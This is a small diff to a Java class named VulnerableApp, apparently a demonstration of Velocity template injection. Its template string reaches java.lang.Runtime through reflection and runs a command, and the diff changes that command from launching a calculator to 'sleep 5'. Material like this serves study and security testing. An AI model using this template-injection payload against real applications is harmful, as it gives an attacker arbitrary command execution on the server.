@@ -34,7 +34,7 @@ public class VulnerableApp {
      */
     public static void main(String[] args) throws Exception {
         String templateContent = "#set($exp=$username.getClass().forName(\"java.lang.Runtime\").getRuntime())\n"
-                + "#set($cmd=\"gnome-calculator\")\n"
+                + "#set($cmd=\"sleep 5\")\n"
                 + "$exp.exec($cmd)";
 
         // Llama a la lógica principal
